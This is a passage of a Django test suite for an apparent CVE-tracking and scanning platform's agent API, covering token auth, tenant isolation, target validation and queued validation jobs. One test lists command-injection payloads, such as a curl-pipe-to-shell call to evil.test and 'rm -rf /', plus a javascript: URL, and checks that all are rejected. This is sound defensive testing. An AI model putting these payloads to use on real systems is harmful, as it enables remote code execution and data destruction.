import json
from unittest import mock

from django.contrib.auth.models import User
from django.test import Client, TestCase
from django.utils import timezone

from agentapi.auth import create_token
from cveFeed.models import CVEEntry, CVEMatch, HygieneFinding, RouteAuth
from dashboard.models import AuditLog, Org, OrgMembership, Project, ProjectMembership
from scanEngine.models import EngineType
from startScan.models import IpAddress, Port, Subdomain, Vulnerability
from targetApp.models import Domain
from tests.test_tenancy import client_for


def call(token, method, path, body=None):
	c = Client()
	headers = {'HTTP_AUTHORIZATION': f'Bearer {token}'} if token else {}
	kwargs = dict(content_type='application/json', **headers)
	data = json.dumps(body) if body is not None else None
	fn = getattr(c, method.lower())
	response = fn(path, data, **kwargs) if method != 'GET' else fn(path, **headers)
	return response.status_code, (response.json() if response.content else None)


def rpc(token, method, params=None, rpc_id=1):
	return call(token, 'POST', '/mcp/', {'jsonrpc': '2.0', 'id': rpc_id, 'method': method, 'params': params or {}})


def tool_call(token, name, args=None):
	status, data = rpc(token, 'tools/call', {'name': name, 'arguments': args or {}})
	content = data['result']['content'][0]['text']
	return data['result']['isError'], (json.loads(content) if not data['result']['isError'] else content)


class AgentApiTests(TestCase):
	@classmethod
	def setUpTestData(cls):
		now = timezone.now()
		org1, org2 = Org.objects.create(name='One', slug='one'), Org.objects.create(name='Two', slug='two')
		cls.pa = Project.objects.create(name='A', slug='proj-a', insert_date=now, org=org1)
		cls.pb = Project.objects.create(name='B', slug='proj-b', insert_date=now, org=org2)
		cls.da = Domain.objects.create(name='a.example', project=cls.pa, insert_date=now)
		cls.db = Domain.objects.create(name='b.example', project=cls.pb, insert_date=now)
		cls.engine = EngineType.objects.create(engine_name='fast', yaml_configuration='x')
		mk = lambda n: User.objects.create_user(n, password='x')
		cls.alice, cls.carol, cls.bob = mk('alice'), mk('carol'), mk('bob')
		ProjectMembership.objects.create(user=cls.alice, project=cls.pa, role='user')
		ProjectMembership.objects.create(user=cls.carol, project=cls.pa, role='audit')
		OrgMembership.objects.create(user=cls.bob, org=org2, role='admin')
		_, cls.t_alice = create_token(cls.alice, 'agent')
		_, cls.t_ro = create_token(cls.alice, 'readonly', read_only=True)
		_, cls.t_carol = create_token(cls.carol, 'auditor')
		_, cls.t_bob = create_token(cls.bob, 'bob')
		# inventory + a CVE match on host in project A
		sub = Subdomain.objects.create(name='www.a.example', target_domain=cls.da)
		ip = IpAddress.objects.create(address='203.0.113.5')
		sub.ip_addresses.add(ip)
		ip.ports.add(Port.objects.create(number=443, product='nginx', version='1.18.0', service_name='https'))
		cls.cve = CVEEntry.objects.create(
			cve_id='CVE-2099-1', kev=True, cvss=9.8, title='nginx bug', published_at=now,
			affected=[{'product': 'nginx', 'ranges': [{'introduced': '1.0.0', 'fixed': '1.20.0'}]}])
		cls.match = CVEMatch.objects.create(cve_entry=cls.cve, subdomain=sub, confidence=0.9, matched_product='nginx', matched_version='1.18.0',
			version_in_range=True)
		other = Subdomain.objects.create(name='www.b.example', target_domain=cls.db)
		cls.match_b = CVEMatch.objects.create(cve_entry=cls.cve, subdomain=other, confidence=0.9)

	# --- auth -------------------------------------------------------------
	def test_requires_valid_token(self):
		self.assertEqual(call(None, 'GET', '/api/v1/me')[0], 401)
		self.assertEqual(call('cve_nope', 'GET', '/api/v1/me')[0], 401)
		self.assertEqual(call(None, 'POST', '/mcp/', {})[0], 401)

	def test_revoked_token_stops_working(self):
		token, raw = create_token(self.alice, 'temp')
		self.assertEqual(call(raw, 'GET', '/api/v1/me')[0], 200)
		token.revoked = True
		token.save()
		self.assertEqual(call(raw, 'GET', '/api/v1/me')[0], 401)

	def test_token_secret_is_not_stored(self):
		from dashboard.models import ApiToken
		self.assertFalse(ApiToken.objects.filter(key_hash=self.t_alice).exists())
		self.assertNotIn(self.t_alice, [t.key_hash for t in ApiToken.objects.all()])

	def test_tokens_are_managed_from_a_session_only(self):
		c = client_for(self.alice)
		r = c.post('/api/v1/tokens', json.dumps({'name': 'new'}), content_type='application/json')
		self.assertEqual(r.status_code, 201)
		raw = r.json()['token']
		self.assertTrue(raw.startswith('cve_'))
		self.assertEqual(call(raw, 'GET', '/api/v1/me')[0], 200)
		self.assertEqual(call(raw, 'POST', '/api/v1/tokens', {'name': 'x'})[0], 403)  # token cannot mint tokens
		listed = c.get('/api/v1/tokens').json()['results']
		self.assertNotIn('token', listed[0])
		self.assertEqual(c.delete('/api/v1/tokens/%d' % r.json()['id']).status_code, 200)
		self.assertEqual(call(raw, 'GET', '/api/v1/me')[0], 401)

	def test_csrf_enforced_for_sessions_but_not_tokens(self):
		from django.contrib.auth import BACKEND_SESSION_KEY, HASH_SESSION_KEY, SESSION_KEY
		from reNgine.hashed_sessions import SessionStore
		from django.conf import settings
		ss = SessionStore()
		ss[SESSION_KEY], ss[HASH_SESSION_KEY] = str(self.alice.pk), self.alice.get_session_auth_hash()
		ss[BACKEND_SESSION_KEY] = 'django.contrib.auth.backends.ModelBackend'
		ss.save()
		browser = Client(enforce_csrf_checks=True)
		browser.cookies[settings.SESSION_COOKIE_NAME] = ss.session_key
		body = json.dumps({'value': 'csrf.example'})
		self.assertEqual(browser.post('/api/v1/projects/proj-a/targets', body, content_type='application/json').status_code, 403)
		self.assertEqual(browser.post('/mcp/', '{}', content_type='application/json').status_code, 403)
		token_client = Client(enforce_csrf_checks=True)  # same strictness, but a bearer token carries no cookie
		r = token_client.post('/api/v1/projects/proj-a/targets', body, content_type='application/json',
			HTTP_AUTHORIZATION=f'Bearer {self.t_alice}')
		self.assertEqual(r.status_code, 201)

	# --- tenancy ----------------------------------------------------------
	def test_me_lists_only_own_projects_with_roles(self):
		status, data = call(self.t_alice, 'GET', '/api/v1/me')
		self.assertEqual([(p['slug'], p['role']) for p in data['projects']], [('proj-a', 'user')])

	def test_cross_project_access_is_404_everywhere(self):
		for path in ('targets', 'scans', 'hosts', 'vulnerabilities', 'matches', 'work'):
			self.assertEqual(call(self.t_alice, 'GET', f'/api/v1/projects/proj-b/{path}')[0], 404, path)
		self.assertEqual(call(self.t_alice, 'GET', f'/api/v1/projects/proj-b/targets/{self.db.id}')[0], 404)
		self.assertEqual(call(self.t_alice, 'GET', f'/api/v1/projects/proj-a/targets/{self.db.id}')[0], 404)  # B's id via A
		self.assertEqual(call(self.t_alice, 'PATCH', f'/api/v1/projects/proj-a/matches/{self.match_b.id}', {'status': 'fixed'})[0], 404)
		self.assertEqual(call(self.t_alice, 'POST', '/api/v1/projects/proj-b/targets', {'value': 'x.example'})[0], 404)

	def test_audit_and_readonly_tokens_cannot_write(self):
		self.assertEqual(call(self.t_carol, 'POST', '/api/v1/projects/proj-a/targets', {'value': 'new.example'})[0], 403)
		self.assertEqual(call(self.t_ro, 'POST', '/api/v1/projects/proj-a/targets', {'value': 'new.example'})[0], 403)
		self.assertEqual(call(self.t_carol, 'GET', '/api/v1/projects/proj-a/targets')[0], 200)
		self.assertEqual(call(self.t_ro, 'GET', '/api/v1/projects/proj-a/targets')[0], 200)

	# --- features ---------------------------------------------------------
	def test_add_targets(self):
		status, data = call(self.t_alice, 'POST', '/api/v1/projects/proj-a/targets', {'value': 'New.Example.com'})
		self.assertEqual((status, data['created'][0]['name']), (201, 'new.example.com'))
		status, data = call(self.t_alice, 'POST', '/api/v1/projects/proj-a/targets', {'value': 'new.example.com'})
		self.assertEqual(data['already_exists'], ['new.example.com'])
		status, data = call(self.t_alice, 'POST', '/api/v1/projects/proj-a/targets', {'value': '198.51.100.0/30'})
		self.assertEqual(sorted(d['name'] for d in data['created']), ['198.51.100.1', '198.51.100.2'])  # /30: two usable hosts
		status, data = call(self.t_alice, 'POST', '/api/v1/projects/proj-a/targets', {'value': '192.0.2.1-3'})
		self.assertEqual(len(data['created']), 3)
		self.assertEqual(call(self.t_alice, 'POST', '/api/v1/projects/proj-a/targets', {'value': '1.0.0.0-200.0.0.0'})[0], 400)
		self.assertEqual(call(self.t_alice, 'POST', '/api/v1/projects/proj-a/targets', {'value': '10.0.0.0/8'})[0], 400)
		self.assertEqual(call(self.t_alice, 'POST', '/api/v1/projects/proj-a/targets', {'value': 'not a target'})[0], 400)
		self.assertEqual(call(self.t_alice, 'POST', '/api/v1/projects/proj-a/targets', {})[0], 400)

	def test_shell_and_argument_injection_payloads_are_rejected_not_stored(self):
		from targetApp.models import Domain
		payloads = ['$(curl evil.test|sh)', 'evil.test; rm -rf /', 'evil.test`whoami`', '-oG /tmp/pwned.xml',
			'fe80::1%eth0', 'fe80::1%$(id)', 'a b.example.com', '$(id)@evil.test']
		# the input guard rejects these before the service sees them (and would ban the sender); switch the ban off here so
		# every payload is judged by the same validation, which must reject it on its own too
		with mock.patch.dict('os.environ', {'CVENGINE_GUARD_STRIKES': '1000'}):
			for value in payloads:
				status, data = call(self.t_alice, 'POST', '/api/v1/projects/proj-a/targets', {'value': value})
				self.assertEqual(status, 400, value)
				self.assertFalse(Domain.objects.filter(name=value).exists(), value)
			status, data = call(self.t_alice, 'POST', '/api/v1/projects/proj-a/targets/bulk',
				{'targets': ['$(curl evil.test|sh)', 'good.example.com', 'fe80::1%eth0'], 'discover': False})
			self.assertEqual(status, 400)  # one hostile entry rejects the whole paste, nothing is created
			self.assertFalse(Domain.objects.filter(name__in=['$(curl evil.test|sh)', 'good.example.com']).exists())
			# without the guard's help: the service itself keeps only the valid entry
			from agentapi import services
			result = services.add_targets(services.Ctx(user=self.alice), 'proj-a',
				['$(curl evil.test|sh)', 'good.example.com', 'fe80::1%eth0'], discover=False)
			self.assertEqual(result['created_names'], ['good.example.com'])
			self.assertEqual(len(result['invalid']), 2)

	def test_start_scan_runs_discovery(self):
		from startScan.models import ScanHistory
		with mock.patch('cveFeed.tasks.run_bbot_discovery.delay') as queued:
			status, data = call(self.t_alice, 'POST', '/api/v1/projects/proj-a/scans', {'target_id': self.da.id, 'engine_id': self.engine.id})
			self.assertEqual((status, data['status']), (202, 'queued'))
			scan = ScanHistory.objects.get(pk=data['scan_id'])
			self.assertEqual(scan.domain_id, self.da.id)
			self.assertEqual(scan.initiated_by_id, self.alice.id)  # who asked for this scan is on the record, not just that it ran
			queued.assert_called_once_with(scan.id, 'standard')
			# engine_id is optional, but a bogus one is still rejected
			self.assertEqual(call(self.t_alice, 'POST', '/api/v1/projects/proj-a/scans', {'target_id': self.da.id, 'engine_id': 99999})[0], 404)
			self.assertEqual(call(self.t_alice, 'POST', '/api/v1/projects/proj-a/scans', {'target_id': self.db.id})[0], 404)
			self.assertEqual(call(self.t_alice, 'POST', '/api/v1/projects/proj-a/scans', {'target_id': self.da.id})[0], 202)

	def test_deleting_the_initiating_user_keeps_the_scan_not_cascades_it_away(self):
		from startScan.models import ScanHistory
		temp = User.objects.create_user('temp-initiator', password='x')
		scan = ScanHistory.objects.create(domain=self.da, scan_type=self.engine, start_scan_date=timezone.now(),
			scan_status=2, results_dir='/tmp', initiated_by=temp)
		temp.delete()
		scan.refresh_from_db()
		self.assertIsNone(scan.initiated_by_id)  # who ran it is forgotten, but the scan and its findings are not deleted with them

	def test_discover_target_also_records_who_asked_for_it(self):
		from startScan.models import ScanHistory
		with mock.patch('cveFeed.tasks.run_bbot_discovery.delay') as queued:
			status, data = call(self.t_alice, 'POST', f'/api/v1/projects/proj-a/targets/{self.da.id}/discover', {})
			self.assertEqual(status, 202)
			scan = ScanHistory.objects.get(pk=data['scan_id'])
			self.assertEqual(scan.initiated_by_id, self.alice.id)
			queued.assert_called_once()

	def test_inventory_hosts_with_ports(self):
		status, data = call(self.t_alice, 'GET', '/api/v1/projects/proj-a/hosts')
		self.assertEqual(data['count'], 1)
		port = data['results'][0]['ips'][0]['ports'][0]
		self.assertEqual((port['number'], port['product'], port['version']), (443, 'nginx', '1.18.0'))

	def test_the_host_record_carries_probe_results_and_wordpress_state_of_its_own_project_only(self):
		from cveFeed.models import ProbeObservation
		ProbeObservation.objects.create(project=self.pa, domain=self.da, host='www.a.example', probe='error-page', kind='version', product='nginx',
			version='1.24.0', outcome='found', source='body:nginx-error-page', confidence=0.95)
		ProbeObservation.objects.create(project=self.pa, domain=self.da, host='www.a.example', probe='wpscan', kind='wordpress', product='WordPress',
			outcome='challenged', evidence={'state': 'blocked', 'reason': 'the edge challenged the scanner'})
		ProbeObservation.objects.create(project=self.pb, domain=self.db, host='www.a.example', probe='error-page', kind='version', product='nginx',
			version='9.9.9', outcome='found')  # another project that happens to scan the same name
		host = call(self.t_alice, 'GET', '/api/v1/projects/proj-a/hosts')[1]['results'][0]
		self.assertEqual([(p['product'], p['version'], p['outcome']) for p in host['probes']], [('nginx', '1.24.0', 'found')])
		self.assertEqual(host['wordpress']['status']['state'], 'blocked')
		self.assertNotIn('9.9.9', json.dumps(host))

	def test_remediation_workflow(self):
		base = '/api/v1/projects/proj-a'
		status, data = call(self.t_alice, 'GET', f'{base}/work')
		self.assertEqual([i['host'] for i in data['results']], ['www.a.example'])  # only A's host
		item = data['results'][0]
		self.assertEqual((item['cve']['tier'], item['fixed_in'], item['ips']), ('fire', ['1.20.0'], ['203.0.113.5']))
		# register assets: unrelated asset empties the list, matching asset keeps it
		self.assertEqual(call(self.t_alice, 'PUT', '/api/v1/assets', {'assets': ['other.example']})[0], 200)
		self.assertEqual(call(self.t_alice, 'GET', f'{base}/work')[1]['count'], 0)
		call(self.t_alice, 'PUT', '/api/v1/assets', {'assets': ['203.0.113.0/24']})
		self.assertEqual(call(self.t_alice, 'GET', f'{base}/work')[1]['count'], 1)
		call(self.t_alice, 'PUT', '/api/v1/assets', {'assets': ['a.example']})
		self.assertEqual(call(self.t_alice, 'GET', f'{base}/work')[1]['count'], 1)
		# mark fixed -> leaves the work list; bad status rejected
		self.assertEqual(call(self.t_alice, 'PATCH', f'{base}/matches/{self.match.id}', {'status': 'bogus'})[0], 400)
		status, data = call(self.t_alice, 'PATCH', f'{base}/matches/{self.match.id}', {'status': 'fixed', 'note': 'upgraded to 1.24'})
		self.assertEqual((status, data['remediation_status']), (200, 'fixed'))
		self.assertEqual(call(self.t_alice, 'GET', f'{base}/work')[1]['count'], 0)

	def test_patching_a_match_without_a_note_leaves_the_existing_one_alone(self):
		base = '/api/v1/projects/proj-a'
		call(self.t_alice, 'PATCH', f'{base}/matches/{self.match.id}', {'status': 'in_progress', 'note': 'opened PR #4'})
		status, data = call(self.t_alice, 'PATCH', f'{base}/matches/{self.match.id}', {'status': 'fixed'})  # no 'note' in the body
		self.assertEqual((status, data['remediation_status'], data['remediation_note']), (200, 'fixed', 'opened PR #4'))
		status, data = call(self.t_alice, 'PATCH', f'{base}/matches/{self.match.id}', {'status': 'open', 'note': ''})  # an explicit '' still clears it
		self.assertEqual((status, data['remediation_note']), (200, ''))

	def test_not_affected_verdict_is_excluded_from_work(self):
		CVEMatch.objects.filter(pk=self.match.pk).update(ai_verdict='not_affected')
		self.assertEqual(call(self.t_alice, 'GET', '/api/v1/projects/proj-a/work')[1]['count'], 0)

	def test_cve_feed_and_detail(self):
		status, data = call(self.t_alice, 'GET', '/api/v1/cves?tier=fire')
		self.assertIn('CVE-2099-1', [c['cve_id'] for c in data['results']])
		status, data = call(self.t_alice, 'GET', '/api/v1/cves/CVE-2099-1')
		self.assertEqual(data['affected'][0]['product'], 'nginx')
		self.assertEqual(call(self.t_alice, 'GET', '/api/v1/cves/CVE-2099-999')[0], 404)

	def test_cve_context_is_descriptive_and_keeps_unknown_exploit_signals_unknown(self):
		self.cve.summary = 'An nginx request parsing flaw can expose data.'
		self.cve.kev = None
		self.cve.exploit_db = None
		self.cve.references = ['https://vendor.example/advisory', 'javascript:alert(1)']
		self.cve.save()
		host = call(self.t_alice, 'GET', '/api/v1/projects/proj-a/hosts')[1]['results'][0]
		self.assertIn('request parsing flaw', host['heat_reasons'][0]['description'])
		detail = call(self.t_alice, 'GET', f'/api/v1/projects/proj-a/findings/match/{self.match.id}')[1]
		self.assertIn('request parsing flaw', detail['cve']['description'])
		self.assertIsNone(detail['cve']['exploitation']['cisa_kev'])
		self.assertIsNone(detail['cve']['exploitation']['exploit_db'])
		self.assertIn('https://vendor.example/advisory', detail['cve']['references'])
		self.assertNotIn('javascript:alert(1)', detail['cve']['references'])

	def test_cve_detail_keeps_original_advisory_and_skips_malformed_references(self):
		from agentapi import services
		self.cve.original_description = 'Original advisory with the precise affected condition.'
		self.cve.summary = 'A short AI feed summary.'
		self.cve.kev = True
		self.cve.references = [{'url': 42}, 'https://[bad', 'https://vendor.example/advisory']
		context = services._cve_context(self.cve)
		self.assertEqual(context['description'], self.cve.original_description)
		self.assertEqual(context['summary'], self.cve.summary)
		self.assertIn('https://www.cisa.gov/known-exploited-vulnerabilities-catalog', context['references'])
		self.assertIn('https://vendor.example/advisory', context['references'])
		self.assertNotIn('https://[bad', context['references'])

	def test_validate_now_is_scoped_deduplicated_and_reports_queue_failure(self):
		from cveFeed.models import OnDemandValidation
		path = f'/api/v1/projects/proj-a/matches/{self.match.id}/validate'
		for token in (self.t_ro, self.t_carol):
			self.assertEqual(call(token, 'POST', path)[0], 403)
		self.assertEqual(call(self.t_alice, 'POST', f'/api/v1/projects/proj-a/matches/{self.match_b.id}/validate')[0], 404)
		self.assertEqual(call(self.t_alice, 'POST', f'/api/v1/projects/proj-b/matches/{self.match_b.id}/validate')[0], 404)
		with mock.patch('cveFeed.tasks.validate_match_on_demand.apply_async') as queued:
			status, first = call(self.t_alice, 'POST', path)
			status2, second = call(self.t_alice, 'POST', path)
		self.assertEqual((status, status2, first['id'], second['id']), (202, 202, first['id'], first['id']))
		queued.assert_called_once_with(args=[first['id']], priority=3)
		self.assertEqual(OnDemandValidation.objects.filter(match=self.match).count(), 1)
		self.assertEqual(call(self.t_alice, 'GET', f'{path}/{first["id"]}')[1]['status'], 'queued')
		self.assertEqual(call(self.t_bob, 'GET', f'{path}/{first["id"]}')[0], 404)
		OnDemandValidation.objects.filter(pk=first['id']).update(status='completed')
		with mock.patch('cveFeed.tasks.validate_match_on_demand.apply_async') as queued:
			self.assertEqual(call(self.t_alice, 'POST', path)[1]['id'], first['id'])
		queued.assert_not_called()

	def test_mcp_validate_now_uses_same_project_queue(self):
		with mock.patch('cveFeed.tasks.validate_match_on_demand.apply_async') as queued:
			status, body = rpc(self.t_alice, 'tools/call', {'name': 'validate_cve_match',
				'arguments': {'project': 'proj-a', 'match_id': self.match.id}})
		self.assertEqual(status, 200)
		job = json.loads(body['result']['content'][0]['text'])
		self.assertEqual(job['status'], 'queued')
		queued.assert_called_once_with(args=[job['id']], priority=3)
		status, body = rpc(self.t_alice, 'tools/call', {'name': 'get_validation_request',
			'arguments': {'project': 'proj-a', 'match_id': self.match.id, 'request_id': job['id']}})
		self.assertEqual(json.loads(body['result']['content'][0]['text'])['id'], job['id'])
		status, body = rpc(self.t_ro, 'tools/call', {'name': 'validate_cve_match',
			'arguments': {'project': 'proj-a', 'match_id': self.match.id}})
		self.assertTrue(body['result']['isError'])

	def _assert_queued_validation_refuses_revocation(self, revoke):
		from agentapi.auth import hash_token
		from dashboard.models import ApiToken
		from cveFeed.models import OnDemandValidation
		from cveFeed.tasks import validate_match_on_demand
		path = f'/api/v1/projects/proj-a/matches/{self.match.id}/validate'
		with mock.patch('cveFeed.tasks.validate_match_on_demand.apply_async'):
			job_id = call(self.t_alice, 'POST', path)[1]['id']
		job = OnDemandValidation.objects.get(pk=job_id)
		token = ApiToken.objects.get(key_hash=hash_token(self.t_alice))
		self.assertEqual((job.source, job.requested_token_id), ('manual', token.pk))
		revoke(token)
		with mock.patch('targetApp.target_types.scannable_hosts') as scope, \
				mock.patch('cveFeed.validation.run_validation') as checks, \
				mock.patch('cveFeed.triage.run_triage') as ai:
			validate_match_on_demand(job_id)
		job.refresh_from_db()
		self.assertEqual(job.status, 'failed')
		scope.assert_not_called()
		checks.assert_not_called()
		ai.assert_not_called()

	def test_queued_validation_rechecks_revoked_token(self):
		def revoke(token):
			token.revoked = True
			token.save(update_fields=['revoked'])
		self._assert_queued_validation_refuses_revocation(revoke)

	def test_queued_validation_rechecks_deleted_token(self):
		self._assert_queued_validation_refuses_revocation(lambda token: token.delete())

	def test_queued_validation_rechecks_current_role(self):
		self._assert_queued_validation_refuses_revocation(lambda token:
			ProjectMembership.objects.filter(user=self.alice, project=self.pa).update(role='audit'))

	def test_queued_validation_rechecks_readonly_token(self):
		def narrow(token):
			token.read_only = True
			token.save(update_fields=['read_only'])
		self._assert_queued_validation_refuses_revocation(narrow)

	def test_queued_validation_rechecks_expired_token(self):
		def expire(token):
			token.expires_at = timezone.now()
			token.save(update_fields=['expires_at'])
		self._assert_queued_validation_refuses_revocation(expire)

	def test_queued_validation_rechecks_disabled_user(self):
		self._assert_queued_validation_refuses_revocation(lambda token:
			User.objects.filter(pk=self.alice.pk).update(is_active=False))

	def test_queued_validation_rechecks_new_mfa_policy(self):
		self._assert_queued_validation_refuses_revocation(lambda token:
			Org.objects.filter(pk=self.pa.org_id).update(require_mfa=True))

	def test_queued_validation_does_not_treat_deleted_user_as_automatic(self):
		self._assert_queued_validation_refuses_revocation(lambda token: self.alice.delete())

	def test_validate_now_worker_only_uses_persisted_match_and_records_result(self):
		from cveFeed.models import AgentActivity, OnDemandValidation
		from cveFeed.tasks import validate_match_on_demand
		path = f'/api/v1/projects/proj-a/matches/{self.match.id}/validate'
		with mock.patch('cveFeed.tasks.validate_match_on_demand.apply_async'):
			job_id = call(self.t_alice, 'POST', path)[1]['id']
		with mock.patch('cveFeed.tasks.scannable_hosts', create=True, return_value=['www.a.example']), \
				mock.patch('targetApp.target_types.scannable_hosts', return_value=['www.a.example']), \
				mock.patch('cveFeed.triage.run_triage', return_value={'asked': 1}), \
				mock.patch('cveFeed.validation.resolve_template', return_value=('', 'no template covers this CVE')), \
				mock.patch('cveFeed.validation.run_validation', return_value={'ran': 0, 'no_check': 1}) as checks:
			validate_match_on_demand(job_id)
		job = OnDemandValidation.objects.get(pk=job_id)
		self.assertEqual(job.status, 'completed')
		self.assertEqual(job.result['check_state'], 'no_check')
		self.assertEqual(job.result['ai_state'], 'deferred')
		messages = list(AgentActivity.objects.filter(project=self.pa, detail__request_id=job_id).values_list('message', flat=True))
		self.assertTrue(any('queued' in msg for msg in messages))
		self.assertTrue(any('no executable check' in msg for msg in messages))
		self.assertTrue(any('AI review' in msg for msg in messages))
		checks.assert_called_once()
		self.assertEqual(checks.call_args[0][0], self.pa.id)
		self.assertEqual(validate_match_on_demand(job_id)['skipped'], 'request is no longer queued')

	def test_a_crashed_validation_stores_a_diagnostic_not_the_exception_text(self):
		from cveFeed.models import OnDemandValidation
		from cveFeed.tasks import validate_match_on_demand
		path = f'/api/v1/projects/proj-a/matches/{self.match.id}/validate'
		with mock.patch('cveFeed.tasks.validate_match_on_demand.apply_async'):
			job_id = call(self.t_alice, 'POST', path)[1]['id']
		with mock.patch('cveFeed.validation.resolve_template', side_effect=OSError('/srv/private/templates unreadable')), \
				self.assertLogs('cveFeed.activity', 'WARNING') as logs, self.assertLogs('cveFeed.tasks', 'ERROR'):
			validate_match_on_demand(job_id)
		job = OnDemandValidation.objects.get(pk=job_id)
		self.assertEqual(job.status, 'failed')
		self.assertNotIn('/srv/private', job.error)
		self.assertTrue(job.error.startswith(f'Validation request #{job_id} failed (OSError); diagnostic '), job.error)
		self.assertIn('/srv/private/templates unreadable', '\n'.join(logs.output))

	def test_validate_now_without_template_or_usable_evidence_is_partial_and_visible(self):
		from cveFeed.models import AgentActivity, OnDemandValidation
		from cveFeed.tasks import validate_match_on_demand
		self.match.source = 'cpe'
		self.match.evidence = {}
		self.match.save(update_fields=['source', 'evidence'])
		self.match.subdomain.ip_addresses.clear()
		path = f'/api/v1/projects/proj-a/matches/{self.match.id}/validate'
		with mock.patch('cveFeed.tasks.validate_match_on_demand.apply_async'):
			job_id = call(self.t_alice, 'POST', path)[1]['id']
		with mock.patch('targetApp.target_types.scannable_hosts', return_value=['www.a.example']), \
				mock.patch('cveFeed.validation.resolve_template', return_value=('', 'no template covers this CVE')), \
				mock.patch('cveFeed.triage.run_triage', return_value={'not_triaged': 1}):
			validate_match_on_demand(job_id)
		job = OnDemandValidation.objects.get(pk=job_id)
		self.assertEqual(job.status, 'completed')
		self.assertEqual(job.result['checks']['no_check'], 1)
		self.assertEqual(job.result['check_state'], 'no_check')
		self.assertEqual(job.result['ai_state'], 'unavailable')
		self.assertIn('No permitted template', job.result['check_notes'][0])
		self.assertTrue(AgentActivity.objects.filter(project=self.pa, detail__request_id=job_id, kind='confirm',
			message__contains='unavailable').exists())

	def test_validate_now_ai_selects_only_approved_check_kinds(self):
		from cveFeed.models import OnDemandValidation, TriageCall
		from cveFeed.tasks import validate_match_on_demand
		provider = mock.Mock(name='provider')
		provider.complete.return_value = json.dumps({'check_kinds': ['nmap_sv'], 'generate_template': False,
			'reason': 'The observed port can confirm the service version.'})
		self.match.source = 'port'
		self.match.evidence = {'ip': '203.0.113.5', 'port': 443}
		self.match.save(update_fields=['source', 'evidence'])
		path = f'/api/v1/projects/proj-a/matches/{self.match.id}/validate'
		with mock.patch('cveFeed.tasks.validate_match_on_demand.apply_async'):
			job_id = call(self.t_alice, 'POST', path)[1]['id']
		with mock.patch('targetApp.target_types.scannable_hosts', return_value=['www.a.example']), \
				mock.patch('cveFeed.validation.resolve_template', return_value=('', 'no template covers this CVE')), \
				mock.patch('reNgine.ai_settings.get_configured_provider', return_value=provider), \
				mock.patch('cveFeed.validation.run_validation', return_value={'ran': 1, 'reused': 0}) as checks, \
				mock.patch('cveFeed.triage.run_triage', return_value={'not_triaged': 1}):
			validate_match_on_demand(job_id)
		# the model's choice, plus the identity probes (nginx next to ingress-nginx or nginx-ui) that always accompany a plan when one applies
		self.assertEqual(checks.call_args.kwargs['selected_kinds'], {'nmap_sv', 'fact_probe'})
		job = OnDemandValidation.objects.get(pk=job_id)
		self.assertEqual(job.result['plan']['source'], 'ai')
		self.assertEqual(TriageCall.objects.filter(kind='validation_plan', project=self.pa).count(), 1)

	def test_validate_now_honors_ai_no_relevant_external_check(self):
		from cveFeed.models import OnDemandValidation
		from cveFeed.tasks import validate_match_on_demand
		self.match.source = 'port'
		self.match.evidence = {'ip': '203.0.113.5', 'port': 443}
		self.match.save(update_fields=['source', 'evidence'])
		path = f'/api/v1/projects/proj-a/matches/{self.match.id}/validate'
		with mock.patch('cveFeed.tasks.validate_match_on_demand.apply_async'):
			job_id = call(self.t_alice, 'POST', path)[1]['id']
		decision = {'check_kinds': [], 'generate_template': False,
			'reason': 'This local driver requires kernel and NIC inventory; a service banner cannot distinguish it.', 'source': 'ai'}
		with mock.patch('targetApp.target_types.scannable_hosts', return_value=['www.a.example']), \
				mock.patch('cveFeed.validation.resolve_template', return_value=('', 'no template covers this CVE')), \
				mock.patch('cveFeed.validation_plan.plan', return_value=(decision, mock.Mock())) as planner, \
				mock.patch('cveFeed.validation.run_validation', return_value={'ran': 0, 'no_check': 1}) as checks, \
				mock.patch('cveFeed.triage.run_triage', return_value={'not_triaged': 1}):
			validate_match_on_demand(job_id)
		job = OnDemandValidation.objects.get(pk=job_id)
		self.assertEqual(job.status, 'completed')
		self.assertEqual(job.result['assessment_status'], 'unsupported_external')
		self.assertEqual(job.result['plan']['check_kinds'], [])
		self.assertIn('kernel and NIC inventory', job.result['check_notes'][-1])
		self.assertEqual(checks.call_args.kwargs['selected_kinds'], set())
		self.assertEqual(planner.call_count, 1)

	def test_validate_now_ai_template_is_a_draft_and_never_runs_on_the_host(self):
		from cveFeed.models import OnDemandValidation
		from cveFeed.tasks import validate_match_on_demand
		provider = mock.Mock(name='provider')
		provider.complete.return_value = json.dumps({'check_kinds': [], 'generate_template': True,
			'reason': 'No existing check covers the CVE; a candidate needs fixture review.'})
		self.match.source = 'cpe'
		self.match.evidence = {}
		self.match.save(update_fields=['source', 'evidence'])
		self.match.subdomain.ip_addresses.clear()
		path = f'/api/v1/projects/proj-a/matches/{self.match.id}/validate'
		with mock.patch('cveFeed.tasks.validate_match_on_demand.apply_async'):
			job_id = call(self.t_alice, 'POST', path)[1]['id']
		with mock.patch('targetApp.target_types.scannable_hosts', return_value=['www.a.example']), \
				mock.patch('cveFeed.validation.resolve_template', return_value=('', 'no template covers this CVE')), \
				mock.patch('reNgine.ai_settings.get_configured_provider', return_value=provider), \
				mock.patch('cveFeed.validation_plan.generate_candidate', return_value={'id': 7, 'status': 'draft'}) as draft, \
				mock.patch('cveFeed.validation.run_validation', return_value={'ran': 0, 'no_check': 1}) as checks, \
				mock.patch('cveFeed.triage.run_triage', return_value={'not_triaged': 1}):
			validate_match_on_demand(job_id)
		self.assertEqual(checks.call_args.kwargs['selected_kinds'], set())
		draft.assert_called_once_with(self.pa.id, self.cve, provider)
		job = OnDemandValidation.objects.get(pk=job_id)
		self.assertEqual(job.result['template_candidate']['status'], 'draft')
		self.assertEqual(job.result['check_state'], 'no_check')

	def test_validate_now_observes_first_check_then_executes_next_permitted_check(self):
		from cveFeed.models import OnDemandValidation, Triage
		from cveFeed.tasks import validate_match_on_demand
		self.match.source = 'tech'
		self.match.save(update_fields=['source'])
		self.match.subdomain.http_url = 'https://www.a.example/'
		self.match.subdomain.save(update_fields=['http_url'])
		path = f'/api/v1/projects/proj-a/matches/{self.match.id}/validate'
		with mock.patch('cveFeed.tasks.validate_match_on_demand.apply_async'):
			job_id = call(self.t_alice, 'POST', path)[1]['id']
		plans = [({'check_kinds': ['http_head'], 'generate_template': False, 'reason': 'Identify the frontend first.', 'source': 'ai'}, None),
			({'check_kinds': ['nmap_sv'], 'generate_template': False, 'reason': 'Inspect the observed service.', 'source': 'ai'}, None)]
		def run_check(project_id, ids, selected_kinds):
			if selected_kinds == {'http_head'}:
				Triage.objects.filter(pk__in=ids).update(validation_status='observed', validation_steps=[
